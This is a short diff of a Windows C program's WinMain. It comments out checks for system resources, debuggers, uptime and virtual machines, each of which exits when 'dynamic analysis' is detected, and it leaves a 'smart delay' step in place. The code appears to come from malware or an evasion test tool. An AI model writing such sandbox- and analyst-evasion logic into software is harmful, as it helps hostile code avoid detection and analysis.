@@ -30,16 +30,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     // TODO: FIX RESOURCE CHECK
     DEBUG_PRINT(" -> Checking system resources...");
-    //if (!check_resources()) {
-    //  DEBUG_PRINT("[!] Dynamic analysis detected. Exit.");
-    //    return 0;
-    //}
+    /*
+    if (!check_resources()) {
+        DEBUG_PRINT("[!] Dynamic analysis detected. Exit.");
+        return 0;
+    }
+        */
 
     DEBUG_PRINT(" -> Checking Debugger, Uptime and VM...");
+    /*
     if (!check_debugger() || !check_uptime() || !check_vm()) {
         DEBUG_PRINT("[!] Dynamic analysis detected. Exit.");
         return 0;
     }
+    */
 
     DEBUG_PRINT(" -> Smart Delay in progress...");
     smart_delay();
